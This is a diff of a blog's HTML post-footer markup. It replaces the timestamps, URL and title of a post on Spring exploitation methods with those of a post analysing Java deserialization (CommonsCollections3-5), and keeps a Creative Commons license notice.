-    <p><span class="copy-title">Updated At:</span>2021-11-20, 22:19:48</p>
-    <span class="copy-title">Url:</span><a class="post-url" href="/2021/11/20/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-Spring%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" title="应用安全-Spring利用方式">http://example.com/2021/11/20/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-Spring%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</a>
+    <p><span class="copy-title">Created At:</span>2021-12-06, 22:00:12</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-12, 20:36:43</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections3-5分析">http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
     </p>
